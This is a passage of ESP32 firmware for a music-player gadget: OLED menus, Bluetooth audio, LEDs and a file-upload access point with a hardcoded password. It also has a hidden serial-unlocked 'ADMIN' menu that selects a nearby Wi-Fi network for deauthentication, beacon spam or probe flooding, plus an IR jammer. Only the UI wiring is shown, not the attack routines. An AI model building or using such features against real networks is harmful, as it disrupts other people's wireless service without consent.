        if (si < 0 || si >= songCount) continue;
        int y = (int)roundf(baseY + (si - smScroll) * rowH);
        bool s = fabsf((float)si - (smSel - 1.0f)) < 0.7f;
        if (s) { display.fillRoundRect(8, y, SCR_W-16, rowH-2, 6, WHITE); display.setTextColor(BLACK); iMusic(12, y+3, BLACK); }
        else   { display.drawRoundRect(10, y, SCR_W-20, rowH-2, 6, WHITE); display.setTextColor(WHITE); iMusic(14, y+3, WHITE); }
        char b[20]; snprintf(b, sizeof(b), "%.16s", songName(si).c_str());
        display.setCursor(24, y+4); display.print(b);
    }
    display.fillRect(0, 0, SCR_W, baseY-2, BLACK);
    hdr("TRACKS");
    bool wf = smSel < 0.5f;
    if (wf) display.fillRoundRect(2, 14, 20, 10, 3, WHITE);
    iWifi(8, 15, wf ? BLACK : WHITE);
    display.display();
}

static void sPlayer(){
    display.clearDisplay();
    display.drawRoundRect(4, 18, 24, 24, 4, WHITE);
    iMusic(12, 26, WHITE);
    display.setTextColor(WHITE); display.setTextSize(1);
    String n = songName(g.currentSong);
    char t[16]; strncpy(t, n.c_str(), 14); t[14] = 0;
    display.setCursor(34, 20); display.print(t);
    const char* st = a2dpStreaming ? "Streaming" :
                     (a2dpConnected ? "Connected" : "Searching TWS");
    display.setCursor(34, 30); display.print(st);
    for (int i = 0; i < 4; i++) {
        int h = 2 + ((animFrame * (i+1)) % 12);
        display.fillRect(100 + i*5, 42 - h, 3, h, WHITE);
    }
    display.drawRoundRect(4, 50, 120, 4, 2, WHITE);
    int fw = (animFrame/2) % 120;
    display.fillRoundRect(4, 50, fw, 4, 2, WHITE);
    hdrL("PLAYING");
    display.display();
}

const char* BT_M[] = {"Scan Devices","Connect","Back"};
static void sBtMenu(){
    const int count = 3, rowH = 12, baseY = 16;
    smTick(M_BT_MENU, g.subSel, 0);
    display.clearDisplay(); hdr("BLUETOOTH");
    float pillY = baseY + smSel * rowH;
    display.fillRoundRect(0, (int)roundf(pillY), SCR_W, rowH-1, 3, WHITE);
    for (int idx = 0; idx < count; idx++) {
        int y = baseY + idx * rowH;
        bool s = fabsf((float)idx - smSel) < 0.7f;
        uint16_t c = s ? BLACK : WHITE;
        display.setTextColor(c);
        display.fillTriangle(2, y+5, 5, y+2, 5, y+8, c);
        iBT(10, y+2, c);
        display.setCursor(22, y+3); display.print(BT_M[idx]);
    }
    display.setTextColor(WHITE); display.display();
}

static void sBtScan(){
    display.clearDisplay(); hdrL("BT SCAN");
    int cx = SCR_W/2, cy = 34;
    if (btScanning) {
        for (int ring = 0; ring < 3; ring++) {
            int r = ((animFrame * 2) + ring * 15) % 45;
            if (r < 4) continue;
            uint16_t c = (r < 15) ? WHITE : (r < 30) ? 0x7BEF : 0x39E7;
            display.drawCircle(cx, cy, r, c);
        }
        display.fillCircle(cx, cy, 3, WHITE);
        float ang = animFrame * 0.12f;
        for (int len = 6; len < 40; len += 2) {
            int sx = cx + (int)(cosf(ang) * len);
            int sy = cy + (int)(sinf(ang) * len);
            if (sx >= 0 && sx < SCR_W && sy >= 20 && sy < 56) display.drawPixel(sx, sy, WHITE);
        }
        display.setTextSize(1); display.setTextColor(WHITE);
        display.setCursor(4, 4); display.print("SEARCHING");
        display.setCursor(SCR_W - 20, 4); display.print(btDevCount);
        display.setCursor(4, 57); display.print("Scanning");
    } else {
        display.setTextSize(1); display.setTextColor(WHITE);
        display.setCursor(4, 4);
        char hb[24]; snprintf(hb, sizeof(hb), "Devices %d", btDevCount);
        display.print(hb);
        int start = (btSel > 2) ? (btSel - 2) : 0;
        int y = 18;
        for (int i = start; i < btDevCount && y < 60; i++, y += 12) {
            bool s = (i == btSel);
            if (s) display.fillRect(0, y-1, SCR_W, 12, WHITE);
            display.setTextColor(s ? BLACK : WHITE);
            display.setCursor(2, y+1);
            char b[20]; snprintf(b, sizeof(b), "%.16s", btDevs[i].name);
            display.print(b);
            display.setCursor(SCR_W - 26, y+1);
            char r[6]; snprintf(r, sizeof(r), "%d", btDevs[i].rssi);
            display.print(r);
        }
    }
    display.display();
}

static void sLedMenu(){
    display.clearDisplay(); hdr("LED EFFECTS");
    display.setTextSize(1); display.setTextColor(WHITE);
    display.setCursor(4, 20);
    if (g.isPlaying && a2dpStreaming) display.print("Music reactive ON");
    else display.print("Playing static effect");
    display.setCursor(4, 36);
    char b[24]; snprintf(b, sizeof(b), "Effect: %d  Bright: %d", g.curEffect, g.ledBright);
    display.print(b);
    display.setCursor(4, 50); display.print("Web UI to change");
    display.display();
}

static void sWifiFiles(){
    display.clearDisplay(); hdrL("WIFI FILES");
    display.setTextSize(1); display.setTextColor(WHITE);
    display.setCursor(4, 20); display.print(webRunning ? "AP ACTIVE" : "AP OFF");
    if (webRunning) {
        display.setCursor(4, 34); display.print("SSID: ESP32-Gadget");
        display.setCursor(4, 44); display.print("Pass: 88888888");
        display.setCursor(4, 54); display.print("URL : 192.168.4.1");
    }
    display.display();
}

static void sInfo(){
    display.clearDisplay(); hdrL("INFO");
    display.setTextSize(1); display.setTextColor(WHITE);
    display.setCursor(4, 18); display.print("SOUMYA Gadget v9.4");
    display.setCursor(4, 30); display.print("ESP32-WROOM-32");
    char u[24]; snprintf(u, sizeof(u), "Up: %lu min", millis()/60000UL);
    display.setCursor(4, 42); display.print(u);
    char s[24]; snprintf(s, sizeof(s), "Songs: %d", songCount);
    display.setCursor(4, 54); display.print(s);
    display.display();
}

// ───── Hidden menu (card stack) ─────
const char* HID_M[] = {"WiFi Tools","BT Tools","IR Remote"};
const char* IR_M[] = {"Learn Code","Transmit Code","IR Jammer"};

static void drawCardMenu(uint8_t sceneID, int sel, const char* title, const char** items, int count){
    const int CARD_W = 112, CARD_H = 14, CARD_STEP = 16, ANCHOR_Y = 26;
    smTick(sceneID, sel, sel);
    display.clearDisplay();
    hdr(title);
    int x = (SCR_W - CARD_W) / 2;
    for (int idx = 0; idx < count; idx++) {
        float yf = ANCHOR_Y + (idx - smSel) * CARD_STEP;
        int y = (int)roundf(yf);
        if (y + CARD_H < 14) continue;
        if (y > SCR_H - 8) continue;
        float dist = fabsf((float)idx - smSel);
        bool s = dist < 0.5f;
        int bob = s ? (int)(sinf(animFrame * 0.12f) * 1.0f) : 0;
        int dy = y + bob;
        if (s) {
            display.fillRoundRect(x, dy, CARD_W, CARD_H, 4, WHITE);
            display.setTextColor(BLACK);
            display.fillTriangle(x+5, dy+CARD_H/2, x+9, dy+CARD_H/2-3, x+9, dy+CARD_H/2+3, BLACK);
            display.setCursor(x+15, dy+(CARD_H-8)/2);
            display.print(items[idx]);
        } else {
            display.drawRoundRect(x, dy, CARD_W, CARD_H, 4, WHITE);
            display.setTextColor(WHITE);
            display.setCursor(x+15, dy+(CARD_H-8)/2);
            display.print(items[idx]);
        }
    }
    display.display();
}

static void sHidden(){ drawCardMenu(M_HIDDEN, g.subSel, "ADMIN", HID_M, 3); }
static void sIrMenu(){ drawCardMenu(M_IR_MENU, g.subSel, "IR REMOTE", IR_M, 3); }

// ───── WiFi AP list ─────
static void sWifiApList(){
    display.clearDisplay();
    display.fillRect(0, 0, SCR_W, 13, WHITE);
    display.setTextColor(BLACK); display.setTextSize(1);
    display.setCursor(4, 3);
    if (scanInProgress) {
        display.print("SCANNING");
        int d = (animFrame/4) % 4;
        for (int i = 0; i < d; i++) display.print(".");
    } else {
        char t[16]; snprintf(t, sizeof(t), "FOUND %d", apCount);
        display.print(t);
    }
    display.setTextColor(WHITE);

    if (scanInProgress || apCount == 0) {
        int cx = SCR_W/2, cy = 36;
        for (int ring = 0; ring < 3; ring++) {
            int r = ((animFrame * 2) + ring * 15) % 40;
            if (r < 4) continue;
            display.drawCircle(cx, cy, r, WHITE);
        }
        display.fillCircle(cx, cy, 3, WHITE);
        float ang = animFrame * 0.12f;
        for (int len = 6; len < 36; len += 2) {
            int sx = cx + (int)(cosf(ang) * len);
            int sy = cy + (int)(sinf(ang) * len);
            if (sy >= 16 && sy < 56) display.drawPixel(sx, sy, WHITE);
        }
        display.setTextSize(1); display.setTextColor(WHITE);
        display.setCursor(4, 57);
        display.print(scanInProgress ? "Please wait..." : "B: back");
        display.display();
        return;
    }

    smTick(M_WIFI_APLIST, g.subSel, 0);
    int rowH = 10, baseY = 15;
    int start = 0;
    if (g.subSel > 3) start = g.subSel - 3;
    if (start + 4 > apCount) start = apCount - 4;
    if (start < 0) start = 0;
    for (int i = 0; i < 4 && (start + i) < apCount; i++) {
        int idx = start + i;
        int y = baseY + i * rowH;
        bool s = (idx == g.subSel);
        if (s) { display.fillRect(0, y, SCR_W, rowH-1, WHITE); display.setTextColor(BLACK); }
        else display.setTextColor(WHITE);
        char b[18]; snprintf(b, sizeof(b), "%.14s", aps[idx].ssid);
        display.setCursor(2, y+1); display.print(b);
        char ch[8]; snprintf(ch, sizeof(ch), "CH%d", aps[idx].channel);
        display.setCursor(86, y+1); display.print(ch);
    }
    display.setTextColor(WHITE);
    display.setCursor(2, SCR_H - 8); display.print("S: attack  B: back");
    display.display();
}

// ───── Attack menu ─────
const char* AP_ATK[] = {"Deauth", "Beacon Spam", "Probe Flood"};
static void sWifiAtkMenu(){
    const int count = 3, rowH = 12, baseY = 16;
    smTick(M_WIFI_ATK, g.subSel, 0);
    display.clearDisplay();
    display.fillRect(0, 0, SCR_W, 13, WHITE);
    display.setTextColor(BLACK); display.setTextSize(1);
    display.setCursor(4, 3);
    char t[24]; snprintf(t, sizeof(t), "Target: %.11s", aps[selectedAP].ssid);
    display.print(t);

    float pillY = baseY + smSel * rowH;
    display.fillRoundRect(0, (int)roundf(pillY), SCR_W, rowH-1, 3, WHITE);
    for (int idx = 0; idx < count; idx++) {
        int y = baseY + idx * rowH;
        bool s = fabsf((float)idx - smSel) < 0.7f;
        uint16_t c = s ? BLACK : WHITE;
        display.setTextColor(c);
        display.fillTriangle(2, y+5, 5, y+2, 5, y+8, c);
        display.setCursor(12, y+3);
        display.print(AP_ATK[idx]);
    }
    display.setTextColor(WHITE);
    display.setCursor(2, SCR_H - 8); display.print("S: start  B: back");
    display.display();
}

static void sAttackRun(){
    display.clearDisplay(); hdrL("ATTACK RUNNING");
    for (int i = 0; i < 6; i++) {
        int x = (i*18 + animFrame*2) % SCR_W;
        int y = 15 + (animFrame * (3 + i%3)) % (SCR_H-25);
        display.drawFastVLine(x, y, random(4, 10), WHITE);
    }
    int bx = SCR_W/2 - 44, by = 22;
    display.fillRect(bx, by, 88, 22, BLACK);
    display.drawRect(bx, by, 88, 22, WHITE);
    display.setTextSize(1); display.setTextColor(WHITE);
    display.setCursor(bx+4, by+3);
    const char* m = (atkMode == ATK_BEACON) ? "BEACON" : (atkMode == ATK_DEAUTH) ? "DEAUTH" : "PROBE";
    display.print(m);
    display.setCursor(bx+4, by+12);
    display.print(aps[selectedAP].ssid);
    char pk[16]; snprintf(pk, sizeof(pk), "%d pkts", atkPkts);
    display.setCursor(4, 57); display.print(pk);
    display.setCursor(SCR_W - 30, 57); display.print("B: stop");
    display.display();
}

static void sIrLearn(){
    display.clearDisplay(); hdrL("IR LEARN");
    int cx = SCR_W/2, cy = 34;
    display.drawCircle(cx, cy, 15, WHITE);
    display.drawCircle(cx, cy, 14, WHITE);
    int scanY = cy - 14 + ((animFrame*2) % 28);
    display.drawFastHLine(cx-14, scanY, 28, WHITE);
    display.setTextSize(1); display.setTextColor(WHITE);
    display.setCursor(30, 54); display.print("WAITING CODE");
    display.display();
}
static void sIrTx(){
    display.clearDisplay(); hdrL("IR TX");
    int cx = SCR_W/2, cy = 32;
    display.fillRect(cx-2, cy, 4, 15, WHITE);
    display.fillTriangle(cx, cy-4, cx-6, cy+2, cx+6, cy+2, WHITE);
    int r1 = (animFrame * 2) % 24;
    if (r1 > 4) { display.drawCircleHelper(cx, cy-4, r1, 1, WHITE); display.drawCircleHelper(cx, cy-4, r1, 2, WHITE); }
    display.setTextSize(1);
    display.setCursor(40, 54); display.print("TX: PWR");
    display.display();
}
static void sIrJam(){
    display.clearDisplay(); hdr("IR JAM");
    int waveBase = 35;
    for (int x = 0; x < SCR_W; x++) {
        int y1 = waveBase + sinf((x + animFrame*4) * 0.1f) * 12;
        int y2 = waveBase + sinf((x - animFrame*6) * 0.15f) * 8;
        display.drawPixel(x, y1, WHITE);
        display.drawPixel(x, y2, WHITE);
    }
    display.setTextSize(1);
    display.setCursor(30, 56); display.print("TX: 940nm");
    display.display();
}

// ───── Router ─────
static void drawCurrent(){
    switch (g.mode) {
        case M_BOOT: sBoot(); break;
        case M_MAIN: sMain(); break;
        case M_SONGS: sSongs(); break;
        case M_PLAYER: sPlayer(); break;
        case M_BT_MENU: sBtMenu(); break;
        case M_BT_SCAN: sBtScan(); break;
        case M_LED_MENU: sLedMenu(); break;
        case M_WIFI_FILES: sWifiFiles(); break;
        case M_HIDDEN: sHidden(); break;
        case M_WIFI_APLIST: sWifiApList(); break;
        case M_WIFI_ATK: sWifiAtkMenu(); break;
        case M_ATTACK_RUN: sAttackRun(); break;
        case M_IR_MENU: sIrMenu(); break;
        case M_IR_LEARN: sIrLearn(); break;
        case M_IR_TX: sIrTx(); break;
        case M_IR_JAM: sIrJam(); break;
        case M_INFO: sInfo(); break;
        default: break;
    }
}

// ───── Handlers ─────
static void onMain(int ev){
    if (ev == 0) g.mainSel = (g.mainSel - 1 + 6) % 6;
    else if (ev == 1) g.mainSel = (g.mainSel + 1) % 6;
    else if (ev == 2) {
        switch (g.mainSel) {
            case 0: if (songCount) playSong(random(0, songCount)); break;
            case 1: g.mode = M_SONGS; g.subSel = 0; break;
            case 2: g.mode = M_BT_MENU; g.subSel = 0; break;
            case 3: g.mode = M_LED_MENU; break;
            case 4: g.mode = M_INFO; break;
            case 5: g.mode = M_WIFI_FILES; startWeb(); break;
        }
    }
}

static void onSongs(int ev){
    int total = songCount + 1;
    if (ev == 0) g.subSel = (g.subSel - 1 + total) % total;
    else if (ev == 1) g.subSel = (g.subSel + 1) % total;
    else if (ev == 2) {
        if (g.subSel == 0) { g.mode = M_WIFI_FILES; startWeb(); }
        else { playSong(g.subSel - 1); g.mode = M_PLAYER; }
    } else if (ev == 3) { g.mode = M_MAIN; g.mainSel = 1; }
}

static void onPlayer(int ev){
    if (ev == 0) nextSong();
    else if (ev == 1) prevSong();
    else if (ev == 2) { if (g.isPlaying) stopSong(); else if (songCount) playSong(g.currentSong >= 0 ? g.currentSong : 0); }
    else if (ev == 3) { g.mode = M_SONGS; g.subSel = g.currentSong + 1; }
}

static void onBtMenu(int ev){
    if (ev == 0) g.subSel = (g.subSel - 1 + 3) % 3;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 3;
    else if (ev == 2) {
        if (g.subSel == 0) {
            g.mode = M_BT_SCAN; btSel = 0;
            btConnectTarget = -1;
            startBtDiscovery();
        } else if (g.subSel == 1) {
            // connect to first found
            if (btDevCount > 0) btConnect(0);
        } else {
            g.mode = M_MAIN; g.mainSel = 2;
        }
    }
    else if (ev == 3) { g.mode = M_MAIN; g.mainSel = 2; }
}

static void onBtScan(int ev){
    if (btScanning) {
        if (ev == 2 || ev == 3) stopBtDiscovery();
        return;
    }
    if (ev == 0 && btSel > 0) btSel--;
    else if (ev == 1 && btSel < btDevCount - 1) btSel++;
    else if (ev == 2 && btDevCount > 0) {
        btConnect(btSel);
        g.mode = M_PLAYER;
    }
    else if (ev == 3) { g.mode = M_BT_MENU; g.subSel = 0; btConnectTarget = -1; }
}

static void onHidden(int ev){
    if (ev == 0) g.subSel = (g.subSel - 1 + 3) % 3;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 3;
    else if (ev == 2) {
        if (g.subSel == 0) {
            shutdownBTForWiFi();
            g.mode = M_WIFI_APLIST;
            g.subSel = 0;
            startAsyncScan();
        } else if (g.subSel == 1) {
            g.mode = M_BT_MENU; g.subSel = 0;
        } else {
            g.mode = M_IR_MENU; g.subSel = 0;
        }
    } else if (ev == 3) g.mode = M_MAIN;
}

static void onWifiApList(int ev){
    if (scanInProgress) {
        if (ev == 3) { scanInProgress = false; g.mode = M_HIDDEN; g.subSel = 0; }
        return;
    }
    if (ev == 0 && g.subSel > 0) g.subSel--;
    else if (ev == 1 && g.subSel < apCount - 1) g.subSel++;
    else if (ev == 2 && apCount > 0) {
        selectedAP = g.subSel;
        g.mode = M_WIFI_ATK;
        g.subSel = 0;
    }
    else if (ev == 3) { g.mode = M_HIDDEN; g.subSel = 0; }
}

static void onWifiAtk(int ev){
    if (ev == 0) g.subSel = (g.subSel - 1 + 3) % 3;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 3;
    else if (ev == 2) {
        if (g.subSel == 0) startDeauth(selectedAP);
        else if (g.subSel == 1) startBeacon();
        else startProbe();
        g.mode = M_ATTACK_RUN;
    }
    else if (ev == 3) { g.mode = M_WIFI_APLIST; g.subSel = selectedAP; }
}

static void onAttackRun(int ev){
    if (ev == 3 || ev == 2) { stopAttack(); g.mode = M_WIFI_ATK; g.subSel = 0; }
}

static void onIrMenu(int ev){
    if (ev == 0) g.subSel = (g.subSel - 1 + 3) % 3;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 3;
    else if (ev == 2) {
        if (g.subSel == 0) g.mode = M_IR_LEARN;
        else if (g.subSel == 1) g.mode = M_IR_TX;
        else g.mode = M_IR_JAM;
    } else if (ev == 3) { g.mode = M_HIDDEN; g.subSel = 2; }
}

static int pollButtons(){
    if (gSerialEv >= 0) { int e = gSerialEv; gSerialEv = -1; return e; }
    return -1;
}

static void webTask(void*){
    for (;;) {
        if (webRunning) ledServer.handleClient();
        vTaskDelay(pdMS_TO_TICKS(5));
    }
}

static void uiTask(void*){
    unsigned long lastDraw = 0;
    for (;;) {
        int ev = pollButtons();
        if (ev >= 0) wakeDisplay();

        pollScan();

        // LED update
        if (g.mode == M_LED_MENU || g.mode == M_MAIN ||
            g.mode == M_PLAYER || g.mode == M_ATTACK_RUN) updateLED();

        if (ev >= 0 && ev < 4) {
            switch (g.mode) {
                case M_MAIN: onMain(ev); break;
                case M_SONGS: onSongs(ev); break;
                case M_PLAYER: onPlayer(ev); break;
                case M_BT_MENU: onBtMenu(ev); break;
                case M_BT_SCAN: onBtScan(ev); break;
                case M_HIDDEN: onHidden(ev); break;
                case M_WIFI_APLIST: onWifiApList(ev); break;
                case M_WIFI_ATK: onWifiAtk(ev); break;
                case M_ATTACK_RUN: onAttackRun(ev); break;
                case M_IR_MENU: onIrMenu(ev); break;
                case M_IR_LEARN: case M_IR_TX: case M_IR_JAM:
                    if (ev == 3) { g.mode = M_IR_MENU; g.subSel = 0; } break;
                case M_LED_MENU: if (ev == 3) { g.mode = M_MAIN; g.mainSel = 3; } break;
                case M_WIFI_FILES: if (ev == 3) { stopWeb(); g.mode = M_MAIN; g.mainSel = 5; } break;
                case M_INFO: if (ev == 3) g.mode = M_MAIN; break;
                default: if (ev == 3) g.mode = M_MAIN; break;
            }
        }

        unsigned long now = millis();
        if (now - lastDraw > 33) {     // 30 FPS target
            lastDraw = now;
            animFrame++;
            drawCurrent();
        }
        vTaskDelay(pdMS_TO_TICKS(10));
    }
}

static void audioTask(void*){
    for (;;) {
        if (g.isPlaying && audioMP3 && audioMP3->isRunning()) {
            if (!audioMP3->loop()) { g.isPlaying = false; nextSong(); }
        }
        vTaskDelay(pdMS_TO_TICKS(1));
    }
}

// ───── Setup ─────
void setup(){
    Serial.begin(115200);
    delay(500);
    Serial.println("\n=== SOUMYA Gadget v9.4 ===");
    Serial.println("Commands: u d s b hid");

    SPI.begin(PIN_SD_SCK, PIN_SD_MISO, PIN_SD_MOSI, PIN_SD_CS);
    if (!SD.begin(PIN_SD_CS)) Serial.println("[!] SD FAIL");
    else { Serial.println("[+] SD OK"); loadSongs(); Serial.printf("[+] %d songs\n", songCount); }

    Wire.begin(OLED_SDA, OLED_SCL);
    Wire.setClock(400000);
    if (!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR)) {
        Serial.println("[!] OLED FAIL");
        while (1) delay(1000);
    }
    display.clearDisplay(); display.display();

    FastLED.addLeds<WS2812B, PIN_LED_DATA, GRB>(mainLeds, LED_MAX);
    FastLED.addLeds<WS2812B, PIN_STATUS_LED, GRB>(flashLeds, STATUS_LED_COUNT);
    FastLED.setBrightness(255);
    FastLED.clear(true);

    audioRB = new AudioOutRB();
    randomSeed(analogRead(0));
    lastActivity = millis();

    xTaskCreatePinnedToCore(audioTask, "audio", 8192, nullptr, 2, nullptr, 1);
    xTaskCreatePinnedToCore(webTask,   "web",   8192, nullptr, 1, nullptr, 1);
    xTaskCreatePinnedToCore(uiTask,    "ui",   10240, nullptr, 1, nullptr, 0);
}

void loop(){
    static String cmdBuf = "";
    while (Serial.available()) {
        char c = Serial.read();
        if (c == '\n' || c == '\r') {
            cmdBuf.trim(); cmdBuf.toLowerCase();
            if      (cmdBuf == "up"   || cmdBuf == "u") gSerialEv = 0;
            else if (cmdBuf == "down" || cmdBuf == "d") gSerialEv = 1;
            else if (cmdBuf == "sel"  || cmdBuf == "s") gSerialEv = 2;
            else if (cmdBuf == "back" || cmdBuf == "b") gSerialEv = 3;
            else if (cmdBuf == "hid"  || cmdBuf == "hidden") {
                g.mode = M_HIDDEN; g.subSel = 0;
                Serial.println(">> HIDDEN menu");
            }
            else if (cmdBuf == "help" || cmdBuf == "?") {
                Serial.println("\n up/u  down/d  sel/s  back/b  hid  help\n");
            }
            cmdBuf = "";
        } else cmdBuf += c;
    }
    vTaskDelay(pdMS_TO_TICKS(20));
}
